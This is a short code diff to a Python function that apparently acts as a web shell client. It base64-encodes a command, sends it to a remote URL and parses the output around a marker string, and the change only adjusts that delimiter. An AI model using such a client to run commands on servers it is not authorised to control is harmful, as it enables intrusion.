@@ -38,7 +38,7 @@ def shell(argv):
     if len(argv) == 3:
         cmd = base64.b64encode(cmd)
         response = requests.get(url.format(cmd)).text
-        extras = response.split("thisistest")
+        extras = response.split("thisistest\n")
 	if len(extras) == 3:
 		extras = [extras[0],extras[2]]
 	
